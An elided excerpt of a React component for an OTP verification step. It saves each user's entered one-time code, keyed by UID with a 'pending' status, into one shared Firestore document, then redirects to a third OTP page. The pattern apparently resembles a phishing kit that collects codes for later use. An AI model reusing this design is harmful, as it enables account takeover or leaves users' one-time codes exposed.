...
export default function OTPVerification() {
  ...
  const handleSubmit = async (e: React.FormEvent) => {
    ...
    try {
      // Store OTP data in "users" database, document "fifthform", with UID as field name
      const fifthformDocRef = doc(db, "users", "fifthform")
      await setDoc(fifthformDocRef, {
        [uid]: {
          otpCode: otpCode,
          uid: uid,
          createdAt: serverTimestamp(),
          status: "pending",
          step: "otpVerification2"
        }
      }, { merge: true })
      ...
      // Navigate to otp3 page with the same UID
      router.push(`/otp3?uid=${uid}`)
        ...
        <div className="w-full max-w-[600] mb-40">
          ...
          <div className="mb-8">
            ...
            <div className="w-full bg-slate-300 h-6 rounded-sm overflow-hidden flex items-center">
              ...
              <div
                className="h-full w-1/2 flex items-center justify-center text-white text-sm font-bold relative"
                style={{
